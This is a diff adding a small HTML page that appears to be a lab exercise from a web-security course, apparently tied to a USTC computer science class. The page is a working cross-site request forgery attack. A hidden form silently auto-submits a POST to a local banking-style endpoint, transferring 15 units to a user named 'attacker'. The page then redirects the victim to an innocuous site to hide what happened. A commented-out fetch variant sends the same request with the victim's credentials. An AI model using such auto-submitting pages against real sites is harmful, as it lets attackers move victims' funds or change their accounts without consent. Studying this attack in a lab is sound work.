@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+
+<head></head>
+
+<body>
+    <form action="http://localhost:3000/post_transfer" method="post" target="iframe" style="display: none;">
+        <input name="destination_username" value="attacker">
+        <input name="quantity" value="15">
+    </form>
+    <iframe name="iframe" src="" style="display: none;"></iframe>
+    <script>
+        document.querySelector("iframe").addEventListener("load", () => {
+            location.href = "https://cs.ustc.edu.cn/";
+        });
+        document.querySelector("form").submit();
+    </script>
+    <!-- <script>
+        fetch("http://localhost:3000/post_transfer", {
+            method: "POST",
+            credentials: "include",
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
+            },
+            body: "destination_username=attacker&quantity=15"
+        }).then(r => r.text()).then(
+            text => {
+                console.log(text);
+                // alert(1);
+                location.href = "https://cs.ustc.edu.cn/";
+            }
+        );
+    </script> -->
+</body>
+
+</html>
